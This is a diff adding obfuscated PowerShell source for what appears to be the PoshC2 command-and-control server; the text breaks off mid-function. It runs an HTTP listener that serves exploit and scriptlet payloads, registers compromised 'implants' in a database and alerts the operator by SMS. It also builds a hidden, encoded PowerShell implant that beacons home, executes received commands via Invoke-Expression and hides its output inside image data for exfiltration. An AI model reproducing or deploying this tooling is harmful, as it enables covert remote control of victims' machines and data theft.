+    ${AR`Gu`mENTSto`So`URCEExE} = "-exec bypass -c import-module ${PoshPath}C2-Server.ps1;C2-Server -RestartC2Server '$global:newdir' -PoshPath '$PoshPath'"
+    ${de`STInatI`o`N`paTh} = "$global:newdir\Restart-C2Server.lnk"
+    ${wsH`s`hEll} = &("{3}{0}{1}{2}" -f '-O','b','ject','New') -comObject ("{2}{3}{0}{1}" -f'She','ll','WScri','pt.')
+    ${S`hORtc`Ut} = ${WS`HSh`ELL}.("{1}{2}{0}"-f'cut','Create','Short').Invoke(${DE`STINAt`IoNpA`TH})
+    ${SHOrtC`UT}."T`ARg`eTPa`Th" = ${Sou`Rc`eexE}
+    ${sHOR`Tc`UT}."argUmEn`TS" = ${argUm`E`NTsTOSoUR`c`eEXe}
+    ${s`HoR`TCUt}.("{0}{1}"-f'Sa','ve').Invoke()
+    
+    ${b`ytes} =  ${Z`9C}::("{0}{1}{2}"-f 'Read','AllBy','tes').Invoke("$global:newdir\Restart-C2Server.lnk")
+    ${B`YtEs}[0x15] = ${ByT`es}[0x15] -bor 0x20
+     ${Z`9c}::("{3}{0}{1}{2}" -f 'Al','lBy','tes','Write').Invoke("$global:newdir\Restart-C2Server.lnk", ${By`TeS})
+
+    ${S`OuRce`EXe} = ("{0}{1}{2}"-f'powe','rs','hell.exe')
+    ${aRGumenTStOS`OU`R`c`E`eXe} = "-exec bypass -c import-module ${PoshPath}Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
+    ${DeS`T`InA`TioNPAth} = "$global:newdir\Restart-Implant-Handler.lnk"
+    ${wsh`she`LL} = &("{0}{1}{3}{2}"-f'New','-Obje','t','c') -comObject ("{3}{2}{1}{0}"-f 'l','hel','pt.S','WScri')
+    ${s`HOr`T`cUT} = ${WS`h`ShelL}.("{0}{2}{3}{4}{1}" -f 'C','t','reat','e','Shortcu').Invoke(${D`esTinATI`OnPA`Th})
+    ${sHOrT`c`Ut}."TARGE`TP`AtH" = ${SOUr`c`ee`XE}
+    ${shorT`c`Ut}."A`RG`UMeNTS" = ${ARgUmenT`s`ToSO`U`R`Ce`exE}
+    ${sh`oR`T`cuT}.("{1}{0}" -f'e','Sav').Invoke()
+    
+    ${BYT`ES} =   ${Z`9c}::("{1}{0}{2}"-f 'B','ReadAll','ytes').Invoke("$global:newdir\Restart-Implant-Handler.lnk")
+    ${Byt`ES}[0x15] = ${bYT`es}[0x15] -bor 0x20
+      (iteM  ("{1}{0}{2}" -f 'aRIaBlE:','v','z9c')).vaLuE::("{1}{0}{3}{2}" -f'riteAllB','W','es','yt').Invoke("$global:newdir\Restart-Implant-Handler.lnk", ${BY`TeS})
+}
+
+
+${IMA`gEarr`AY} = @()
+${imaG`Ef`ilE`s`UseD} = @()
+${IM`Ag`eFi`lES} = &("{2}{1}{0}"-f 'ldItem','et-Chi','G') "$PoshPath\Images" | &("{1}{0}{2}" -f 'lec','se','t') ("{2}{0}{1}"-f 'm','e','FullNa')
+${CO`U`Nt} = 0 
+
+while (${co`Unt} -lt 5) {
+
+    ${RAnDO`MIM`AGe} =  ${I`ma`gefiles} | &("{2}{0}{1}" -f 'et-Ra','ndom','G') 
+    ${R`ANDOMi`maGE} = ${R`A`N`DoMImAGe}."F`Ull`NaMe"
+    if (-not (${imA`gefiL`esu`S`eD} -contains ${r`A`NdomIma`ge})){
+
+        ${I`MA`G`EbYTES} = &("{1}{2}{3}{0}" -f 't','Get','-Con','ten') ${RaN`D`OMimAGe} -Encoding ("{0}{1}"-f 'By','te')
+
+        if (${im`A`GEBYT`es}."len`gth" -lt 1495) {
+            ${IMA`GEFi`l`esusEd} += ${Ra`NDo`M`ImAgE}
+            ${I`MAGEb`yT`eS} = &("{1}{2}{0}" -f 'ntent','Get-C','o') ${rA`N`dOmim`Age} -Encoding ("{0}{1}"-f 'By','te')
+            ${Ima`geARR`Ay} +=   ( vArIabLE  ('21'+'J')).vaLue::"TObasE6`4`s`TRiNg"(${IMaG`Eb`yT`ES})
+            ${COu`NT} = ${co`UNT} + 1
+        }
+    }
+}
+
+
+${LISte`NER} = &("{2}{1}{0}"-f 'ject','w-Ob','Ne') -TypeName ("{2}{5}{4}{0}{3}{1}"-f 't','r','System','ene','Lis','.Net.Http') 
+
+if (${iPV`4a`ddrE`ss}.("{1}{2}{0}" -f'ntains','C','o').Invoke(("{1}{0}"-f'ps','htt'))) {
+    ${l`i`StENEr}."P`REFI`Xes".("{0}{1}"-f'Ad','d').Invoke("https://+:$serverport/") 
+} else {
+    ${lI`StE`NER}."Pre`Fi`xes".("{1}{0}" -f 'd','Ad').Invoke("http://+:$serverport/") 
+}
+${R`e`AdhOst} = ("{0}{1}"-f 'PS ','>')
+${Li`STENer}.("{1}{0}" -f 'tart','S').Invoke()
+
+
+while (${liS`T`ener}."i`SLiST`E`NINg") 
+{
+    ${me`SsAGE} = ${nU`LL}
+    ${co`NT`eXt} = ${Lis`T`ENEr}.("{0}{2}{1}" -f'Ge','xt','tConte').Invoke() 
+    ${rEq`UEst} = ${C`onteXt}."Req`U`EST"
+    ${RESP`o`Nse} = ${c`On`TExt}."re`SPo`NsE"
+    
+    ${d`oWN`lO`Ad`stUb} = ${U`RLSTRi`NG} -split ","
+    ${D`oW`NLo`ADstUB`URL} = ${DowNL`O`ADS`Tub}[1] -replace '"',''
+    ${n`ew`i`mPLANt} = ${Ur`ls`TrINg} -split ","
+    ${nEWiMP`lANt`URL} = ${N`EWIMPL`AnT}[0] -replace '"',''
+       
+    if (${rEQu`ESt}."u`Rl" -match "$($downloadStubURL)$($downloaduri)$") 
+    {
+        ${Me`SSa`ge} = ${P`AY`load}
+    }
+    if (${REQU`ESt}."u`Rl" -match "$($downloadStubURL)$($downloaduri)_ms16-051$")
+    {
+        if ( ( lS  ("v"+"ariaBL"+"e:Z"+"9c")  ).VAluE::("{0}{1}" -f'Exist','s').Invoke("$global:newdir/payloads/ms16-051.html")){
+            ${MEss`AgE} = &("{3}{0}{1}{2}"-f'et','-Conte','nt','G') -Path ((("{7}{6}{3}{2}{4}{1}{5}{0}" -f'051.html','ayloads/','ewdir/','l:n','p','ms16-','globa','{0}'))  -f  [chAr]36)
+        }else {
+            ${me`Ssa`GE} = ${htTP`REsp`oN`SE}
+        }
+
+    }
+    if (${R`EQu`ESt}."u`Rl" -match "$($downloadStubURL)$($downloaduri)_rg$") 
+    {
+        
+        if ( (vAriAble  ("Z9"+"C")).vALUE::("{0}{1}" -f'E','xists').Invoke("$global:newdir/payloads/rg_sct.xml")){
+            ${mEsSa`ge} =   ( Gi  ("{2}{1}{0}"-f 'UZ','39','vArIable:q')).vALuE::("{0}{2}{1}"-f 'ReadAl','t','lTex').Invoke("$global:newdir/payloads/rg_sct.xml")
+        }else {
+            ${m`esSaGE} = ${h`Tt`PREspOn`sE}
+        }
+       
+    }
+    if (${R`e`qUEST}."U`RL" -match "$($downloadStubURL)$($downloaduri)_cs$") 
+    {
+
+        if ( ${Z`9c}::("{1}{0}"-f 'xists','E').Invoke("$global:newdir/payloads/cs_sct.xml")){
+            ${MEsS`AGe} =  ${Q`39uz}::("{2}{0}{1}"-f 'adA','llText','Re').Invoke("$global:newdir/payloads/cs_sct.xml")
+        }else {
+            ${m`EsSa`Ge} = ${Htt`P`RESponsE}
+        }
+
+    }
+    if (${Re`Qu`est}."u`Rl" -match "$($downloadStubURL)$($downloaduri)_js$") 
+    {
+
+        if ( ${Z`9c}::("{0}{1}" -f 'Ex','ists').Invoke("$global:newdir/payloads/js_sct.xml")){
+            ${MES`S`Age} =  ( gET-VariaBle ("Q"+"39Uz")  -vA)::("{0}{1}{2}" -f 'Rea','dAllTex','t').Invoke("$global:newdir/payloads/js_sct.xml")
+        }else {
+            ${mEsSa`ge} = ${hTtpreSp`o`N`se}
+        }
+
+    }
+    if (${ReQU`e`ST}."u`Rl" -match "$($downloadStubURL)$($downloaduri)_df$") 
+    {
+
+        if (  (  CHILDItem ("{2}{0}{1}"-f 'BLE',':z9c','varia') ).vALUE::("{1}{0}{2}"-f'ist','Ex','s').Invoke("$global:newdir/payloads/df_sct.xml")){
+            ${ME`sSAGe} =   ( VAriAbLe  ("{1}{0}"-f'UZ','Q39')).valUE::("{1}{0}{3}{2}" -f'adAl','Re','xt','lTe').Invoke("$global:newdir/payloads/df_sct.xml")
+        }else {
+            ${mES`S`AGe} = ${ht`T`PrEsPOnse}
+        }
+
+    }
+    if (${r`e`QUEsT}."u`RL" -match "$($downloadStubURL)$($downloaduri)_iu$") 
+    {
+
+        if ( ( VariabLE ("{1}{0}" -f'9c','z')  -vaLuEo  )::("{1}{2}{0}"-f'ists','E','x').Invoke("$global:newdir/payloads/posh.exe")){
+            ${E`xe} = ${tR`UE}
+            ${m`Es`SagE} = &("{2}{1}{0}"-f't-Content','e','G') "$global:newdir/payloads/posh.exe" -Encoding ("{0}{1}" -f 'byt','e')
+        }else {
+            ${MeS`SAge} = ${hTt`P`Resp`O`Nse}
+        }
+
+    }
+    if (((${r`EqUE`st}."u`RL" -match "/$($newImplantURL)$") -or (${RE`qUE`sT}."U`Rl" -match "/$($newImplantURL)\?p") -or (${re`q`UesT}."u`RL" -match "/$($newImplantURL)\?d")) -and ((${REqU`E`ST}."Coo`Ki`Es"[0])."Na`ME" -match ("{0}{1}"-f 'Session','ID'))) 
+    { 
+
+        if (${r`EQUe`st}."u`RL" -match "/$($newImplantURL)\?p") {${tY`Pe} = ("{0}{1}" -f 'Pr','oxy')} 
+        if (${rEQ`Ue`St}."u`RL" -match "/$($newImplantURL)\?d") {${t`Ype} = ("{1}{0}" -f 'y','Dais')} 
+        if (${Re`Q`UEsT}."U`Rl" -match "/$($newImplantURL)$") {${TY`pe} = ("{0}{1}" -f'No','rmal')}
+
+        
+        ${r`A`NdO`MURI} = &("{0}{2}{1}{3}"-f 'Get-','do','Ran','mURI') -Length 15
+        ${R`An`D`oMUriaR`RaY} += ${RANd`o`mUrI}
+
+        
+        ${K`eY} = &("{0}{2}{1}" -f 'Creat','ey','e-AesK')
+        ${eNDp`O`I`NtiP} = ${R`eque`st}."rEM`o`TEEn`DpOi`NT"
+        ${C`OO`K`iep`lAInTeXT} = &("{1}{2}{0}{3}"-f'-S','D','ecrypt','tring') -key ${EN`CKey} -encryptedStringWithIV (${reQU`e`sT}."Coo`K`ies"[0])."Val`UE"
+
+        
+        ${IM`_DOM`AIn},${IM`_usERn`AME},${IM_CoMPU`Te`R`Name},${I`m_ArCh},${IM`_p`ID},${Im_p`RO`Xy} = ${coOkI`eP`lA`I`NTEXt}.("{0}{1}" -f'spli','t').Invoke(";",6)
+
+        if(${iM`_`PID} -gt 0){       
+
+        ${c`2seRV`erREsul`TS} = &("{0}{4}{1}{3}{2}"-f'Inv','-Sq','teQuery','li','oke') -DataSource ${d`ATAb`ASe} -Query ("{3}{2}{6}{0}{5}{4}{1}"-f'* FRO','erver','L','SE',' C2S','M','ECT ') -As ("{1}{0}{2}" -f'O','PS','bject')
+        ${d`E`FaUltBEA`Con} = ${c2SERV`ErRE`s`UL`Ts}."DE`FA`U`LTsLeep"
+
+        
+        
+        
+        
+        
+        
+        ${I`M_f`ir`stseEN} = $(&("{2}{1}{0}" -f 't-Date','e','G'))
+        if (${REq`Ue`St}."u`RL" -match "/$($newImplantURL)\?p") {
+            &("{1}{3}{0}{2}"-f'-','Wri','Host','te') ('Ne'+'w '+'Prox'+'y'+' '+'im'+'pl'+'ant '+'conne'+'cted'+':'+' '+"(uri=$randomuri, "+"key=$key)") -ForegroundColor ("{1}{0}"-f'en','Gre')
+${cONN`e`C`TvaRS} = (('
+MR2URI='+' ').("{0}{1}" -f 'REPl','aCe').Invoke('MR2','$')+'"')+${ra`ND`o`murI}+((('NLS
+'+'A5PS'+'er'+'ver ')-cREPLaCe  'NLS',[CHaR]34  -cREPLaCe ([CHaR]65+[CHaR]53+[CHaR]80),[CHaR]36)+'= '+('{0}'+'{1}'+'s')-f[ChAr]34,[ChAr]36)+'/'+${rAN`D`OmuRI}+(('lL'+'W
+dc8ServerC'+'le'+'an'+' ')."R`ePl`AcE"('dc8',[sTRIng][cHAR]36)."Re`PlAcE"(([cHAR]108+[cHAR]76+[cHAR]87),[sTRIng][cHAR]34)+'= '+('OqBMI'+'JscOqB
+')."R`E`pLaCE"('OqB',[StrIng][ChAr]34)."R`ep`LacE"(([ChAr]77+[ChAr]73+[ChAr]74),'$'))
+        } elseif (${rE`Qu`EsT}."u`Rl" -match "/$($newImplantURL)\?d") {
+            &("{0}{2}{1}"-f 'Wri','-Host','te') ('N'+'ew '+'Dais'+'y '+'i'+'mplan'+'t '+'co'+'n'+'nected: '+"(uri=$randomuri, "+"key=$key)") -ForegroundColor ("{1}{0}"-f 'een','Gr')
+${c`ONNectva`Rs} = (('
+{'+'0}U'+'RI= ')  -f[CHAR]36+'"')+${ra`NdO`muRi}+(('Z6'+'c
+1'+'y4Se'+'r'+'ver ')."rE`PlAce"(([cHar]49+[cHar]121+[cHar]52),[sTriNg][cHar]36)."REP`lA`CE"('Z6c',[sTriNg][cHar]34)+'= '+('dKoH'+'vrs').("{1}{0}"-f 'E','rEpLaC').Invoke('Hvr','$')."rE`Pl`AcE"(([cHAR]100+[cHAR]75+[cHAR]111),[STrinG][cHAR]34))+'/'+${raN`domU`RI}+((('jo'+'A
+nDwS'+'e'+'r'+'verCle'+'an'+' ')-cReplaCE  'joA',[cHaR]34  -cReplaCE  'nDw',[cHaR]36)+'= '+('{'+'0'+'}{1}sc{0}
+')  -F [CHAr]34,[CHAr]36)
+        } else {
+            &("{3}{1}{0}{2}"-f 'te-H','ri','ost','W') ('N'+'ew '+'D'+'irect'+' '+'im'+'plant'+' '+'connect'+'e'+'d:'+' '+"(uri=$randomuri, "+"key=$key)") -ForegroundColor ("{0}{1}"-f'Gree','n')
+${co`Nne`ctv`Ars} = (('
+{0'+'}U'+'RI='+' ')-f [char]36+'"')+${r`AnDO`MurI}+((('5'+'Ll
+0DMServe'+'r ')  -rEpLace  ([chaR]48+[chaR]68+[chaR]77),[chaR]36-rEpLace  '5Ll',[chaR]34)+'= '+(('u'+'cP6T'+'Os')  -REplaCe  'ucP',[cHaR]34-crEpLACe  '6TO',[cHaR]36))+'/'+${RaND`o`MuRI}+(('V'+'D'+'4
+HuWSe'+'r'+'ver'+'Clean'+' ')."rEpLa`cE"('VD4',[StrINg][cHAr]34)."r`e`plACe"('HuW',[StrINg][cHAr]36)+'= '+(('H8qsv3sc'+'H8'+'q
+') -rEPLace ([ChAR]115+[ChAR]118+[ChAR]51),[ChAR]36-crePLACE 'H8q',[ChAR]34))
+        }
+
+        &("{1}{0}{2}" -f 'Ho','Write-','st') ("$endpointip "+(('8'+'3G ')-rEplACE ([Char]56+[Char]51+[Char]71),[Char]124)+"URL:$im_proxy "+('Nr'+'6 ').("{1}{2}{0}" -f'cE','rE','Pla').Invoke('Nr6','|')+"Time:$im_firstseen "+(('dDc'+' ')-creplaCe([CHaR]100+[CHaR]68+[CHaR]99),[CHaR]124)+"PID:$im_pid "+('n'+'kz'+' ')."Rep`La`Ce"('nkz',[StRiNg][ChaR]124)+"Sleep:$defaultbeacon "+('{'+'0} ')  -f [ChaR]124+"$im_computername "+"$im_domain "+"($im_arch) "+'')('
+') -ForegroundColor ("{1}{0}"-f 'en','Gre')
+
+        
+        if ((${A`pi`KEY}) -and (${MObi`LeNu`MBeR})){
+            (&("{0}{2}{1}" -f'New-Obj','ct','e') ("{5}{1}{2}{0}{4}{3}" -f'.Webc','y','stem.Net','ent','li','S')).("{3}{1}{0}{2}{4}"-f 'St','ownload','rin','D','g').Invoke("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=NewImplant:$($im_domain)\$($im_computername)")|&("{0}{1}" -f 'Out-Nu','ll')
+        }
+
+        if (${EN`Ab`LeSouNd} -eq "Yes") {
+            try {
+            ${v`OIcE} = &("{0}{2}{1}"-f'Ne','t','w-Objec') -com ("{1}{2}{0}"-f 'pVoice','SAP','I.S')                        
+            ${v`o`Ice}."Ra`TE" = -2                        
+            ${V`OI`Ce}.("{0}{1}"-f 'Sp','eak').Invoke(("{1}{4}{3}{0}{5}{2}{6}{7}" -f 'ha','Ni','e an i','e ','ce, w','v','mpl','ant'))|&("{1}{2}{0}" -f 'll','O','ut-Nu')
+            } catch {}
+        }
+
+        ${QU`ERy} = ("{75}{28}{8}{6}{72}{4}{65}{14}{69}{15}{31}{73}{56}{64}{18}{45}{24}{60}{54}{61}{48}{1}{12}{63}{35}{17}{30}{2}{20}{22}{44}{32}{76}{77}{71}{68}{34}{38}{49}{3}{59}{55}{46}{51}{19}{39}{57}{29}{33}{41}{5}{11}{67}{58}{0}{50}{43}{16}{10}{25}{13}{9}{23}{7}{40}{47}{37}{27}{62}{52}{21}{36}{53}{66}{70}{74}{26}{42}" -f'ddress',' LastSeen, ','Arch',' Mod','I','stn','U','@PI','T INTO Implants (Random','Seen,','@L','ame','PI','st',' Use','stnam',', @FirstSeen, ','rox','s, K','       VALUES (@R',',',', @Ali',' ',' ',' F','a','d,','r','ER','s','y, ','e','ain','er, @H','ve,',', P','ve, @Sle','roxy, @A',' S','andomURI','D, @','o',' @Pivot)','ey','Dom','ey,','ed, Pivot)','P','n,','leep,',', @K','
+ ','h, @Domain','ep, @','stSe','ad','re',', @U','IpA','sLo','ir','e','c','D','s',',','Mod',', @','i','r, Ho','s','l','R',', IpAdd','Loade','INS',',',' A')
+
+        &("{0}{3}{1}{5}{4}{2}"-f'In','k','uery','vo','teQ','e-Sqli') -DataSource ${dAt`AbA`Se} -Query ${Q`U`eRY} -SqlParameters @{
+            ("{1}{2}{0}{3}"-f'omU','R','and','RI') = ${rAndo`mu`Ri}
+            ("{0}{1}"-f'U','ser')      = ${Im`_`U`SeRName}
+            ("{2}{0}{1}" -f'na','me','Host')  = ${I`M`_COm`p`UteRnaME}
+            ("{2}{1}{0}"-f's','Addres','Ip') = ${R`e`qUest}."reMoteeNdpO`I`NT"
+            ("{0}{1}" -f'Ke','y')       = ${K`Ey}
+            ("{1}{2}{0}" -f'Seen','F','irst') = ${Im`_fIRS`TSe`En}
+            ("{1}{0}" -f'stSeen','La')  = "$(Get-Date)"
+            ("{1}{0}" -f 'D','PI')  = ${I`M_`PID}
+            ("{0}{1}" -f 'Pro','xy')  = ${iM`_p`RoXY}
+            ("{1}{0}" -f'rch','A') = ${IM_`Arch}
+            ("{1}{2}{0}"-f'main','D','o') = ${IM_d`o`M`AIn}
+            ("{1}{0}" -f've','Ali') = "Yes"
+            ("{1}{0}"-f'ep','Sle') = ${D`EF`AuL`T`BeaCON}
+            ("{2}{3}{0}{1}" -f'oade','d','Mo','dsL') = ""
+            ("{1}{0}"-f 'ot','Piv') = "$type"
+        }
+
+	    ${AUTORU`Nr`e`sultS} = &("{2}{3}{0}{4}{1}"-f'Q','y','Invok','e-Sqlite','uer') -DataSource ${DaTAb`A`sE} -Query ("{2}{1}{3}{5}{6}{4}{0}" -f 'ns','E','S','LECT * FROM','u',' Aut','oR') -As ("{0}{1}"-f'PSOb','ject')
+        
+        if (${autoR`UnResu`ltS} -ne ${NU`ll}){
+			&("{0}{3}{1}{2}"-f'Invoke-','ite','Query','Sql') -DataSource ${daTa`B`ASe} -Query ('UPD'+'ATE '+'Imp'+'la'+'n'+'ts '+'S'+'ET '+('M'+'odsLo'+'ade'+'d={0}implant-'+'co'+'r'+'e.p'+'s'+'1{'+'0} ')  -F  [cHar]39+'W'+'HE'+'RE '+"RandomURI='$randomuri'")|&("{1}{0}" -f 'ut-Null','O')
+			${q`UE`Ry} = (("{3}{0}{17}{4}{1}{20}{15}{7}{11}{19}{13}{12}{5}{14}{2}{9}{8}{18}{10}{6}{16}" -f 'E',' NewTask','L','INS','NTO',')
+','I, @C','d',' (@Random','UES','R','omUR','d','omman','			VA',' (Ran','ommand)','RT I','U','I, C','s'))
+			
+			&("{4}{0}{3}{2}{1}"-f'-','y','teQuer','Sqli','Invoke') -DataSource ${DAt`A`BAsE} -Query ${q`UeRy} -SqlParameters @{
+			("{0}{3}{2}{1}" -f 'Ran','RI','mU','do') = ${R`ANdOMU`RI}
+			("{0}{1}"-f'Com','mand')   = ("{2}{3}{1}{4}{5}{0}{8}{7}{6}"-f'plan','Modu','Loa','d','l','e im','1','re.ps','t-co')
+			} | &("{1}{0}{2}" -f 'Nu','Out-','ll')
+			
+            foreach (${I} in ${aU`TORunRE`SUl`TS}) {
+                ${t`As`kee} = ${I}."ta`Sk"
+                			
+                &("{2}{0}{3}{1}" -f 'oke-Sqlite','uery','Inv','Q') -DataSource ${da`Ta`BASE} -Query ${QUe`Ry} -SqlParameters @{
+			    ("{1}{0}{3}{2}" -f'n','Ra','URI','dom') = ${r`ANdOmU`RI}
+			    ("{1}{2}{0}"-f'mand','C','om')   = ${TA`S`KEE}
+                } | &("{2}{1}{0}" -f'l','ul','Out-N')
+			
+            }
+		}
+
+        ${m`ESSage} = ((('
+
+2UTkey'+'='+'UX'+'z')-ReplACe ([CHaR]50+[CHaR]85+[CHaR]84),[CHaR]36  -crePLACE'UXz',[CHaR]34)) + "$key"+(('3t'+'f
+QWwsl'+'ee'+'ptime ').("{1}{0}"-f'E','rEPlaC').Invoke('QWw','$')."r`EplAcE"(([chAR]51+[chAR]116+[chAR]102),[STRiNG][chAR]34)+'= '+'')+${D`efauLt`B`EA`cOn}+'
+
+$payloadclear = @"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+`$s="$s"
+`$sc="$sc"
+function DEC {${function:DEC}}
+function ENC {${function:ENC}}
+function CAM {${function:CAM}}
+function Get-Webclient {${function:Get-Webclient}} 
+function Primer {${function:primer}}
+`$primer = primer
+if (`$primer) {`$primer| iex} else {
+start-sleep 1800
+primer | iex }
+"@
+
+$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
+$CompressedStream = New-Object IO.MemoryStream
+$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+$DeflateStream.Dispose()
+$CompressedScriptBytes = $CompressedStream.ToArray()
+$CompressedStream.Dispose()
+$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
+$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
+$payload = $payloadraw -replace "`n", ""
+
+function GetImgData($cmdoutput) {
+    $icoimage = @("'+${Im`Ag`eaR`RaY}[-1]+'","'+${i`Ma`Ge`ARRaY}[0]+'","'+${iMa`g`eARr`AY}[1]+'","'+${imA`GeARR`AY}[2]+'","'+${ImaGe`A`RrAY}[3]+'")
+    
+    try {$image = $icoimage|get-random}catch{}
+
+    function randomgen 
+    {
+        param (
+            [int]$Length
+        )
+        $set = "...................@..........................Tyscf".ToCharArray()
+        $result = ""
+        for ($x = 0; $x -lt $Length; $x++) 
+        {$result += $set | Get-Random}
+        return $result
+    }
+    $imageBytes = [Convert]::FromBase64String($image)
+    $maxbyteslen = 1500
+    $maxdatalen = 1500 + ($cmdoutput.Length)
+    $imagebyteslen = $imageBytes.Length
+    $paddingbyteslen = $maxbyteslen - $imagebyteslen
+    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
+    $ImageBytesFull = New-Object byte[] $maxdatalen    
+    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
+    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
+    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
+    $ImageBytesFull
+}
+function Create-AesManagedObject($key, $IV) {
+    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {
+    if ($IV.getType().Name -eq "String") {
+    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+    }
+    else {
+    $aesManaged.IV = $IV
+    }
+    }
+    if ($key) {
+    if ($key.getType().Name -eq "String") {
+    $aesManaged.Key = [System.Convert]::FromBase64String($key)
+    }
+    else {
+    $aesManaged.Key = $key
+    }
+    }
+    $aesManaged
+}
+
+function Encrypt-String($key, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    
+    [System.Convert]::ToBase64String($fullData)
+}
+function Encrypt-Bytes($key, $bytes) {
+	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+	$gzipStream.Write( $bytes, 0, $bytes.Length )
+	$gzipStream.Close()
+	$bytes = $output.ToArray()
+	$output.Close()
+	$aesManaged = Create-AesManagedObject $key 
+    $encryptor = $aesManaged.CreateEncryptor() 
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData 
+	$fullData
+}
+function Decrypt-String($key, $encryptedStringWithIV) {
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    
+    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+}
+function Encrypt-String2($key, $unencryptedString) {
+    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
+    $DeflateStream.Dispose()
+    $bytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    $fullData
+}
+function Decrypt-String2($key, $encryptedStringWithIV) {
+    $bytes = $encryptedStringWithIV
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor()
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+    $output
+    
+}
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+'+${COnNE`cTva`Rs}+'
+
+while($true)
+{
+    $date = (Get-Date -Format "dd/MM/yyyy")
+    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
+    $killdate = [datetime]::ParseExact("'+${kI`Ll`DATEFM}+'","dd/MM/yyyy",$null)
+    if ($killdate -lt $date) {exit}
+    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
+    $newsleep = $sleeptimeran|get-random
+    if ($newsleep -lt 1) {$newsleep = 5} 
+    start-sleep $newsleep
+    $URLS = '+${u`Rlst`RiNg}+'
+    $RandomURI = Get-Random $URLS
+    $G=[guid]::NewGuid()
+    $Server = "$ServerClean/$RandomURI$G/?$URI"
+    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
+    
+    while($ReadCommand) {
+        $RandomURI = Get-Random $URLS
+        $G=[guid]::NewGuid()
+        $Server = "$ServerClean/$RandomURI$G/?$URI"
+        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
+        $error.clear()
+        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
+            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
+                    $splitcmd = $ReadCommandClear -replace "multicmd",""
+                    $split = $splitcmd -split "!d-3dion@LD!-d"
+                    foreach ($i in $split){
+                        $RandomURI = Get-Random $URLS
+                        $G=[guid]::NewGuid()
+                        $Server = "$ServerClean/$RandomURI$G/?$URI"
+                        $error.clear()
+                        if ($i.ToLower().StartsWith("upload-file")) {
+                            try {
+                                $Output = Invoke-Expression $i | out-string
+                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
+                                $ModuleLoaded = Encrypt-String $key $result
+                                $Output = Encrypt-String2 $key $Output
+                                $UploadBytes = getimgdata $Output
+                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+                            } catch {
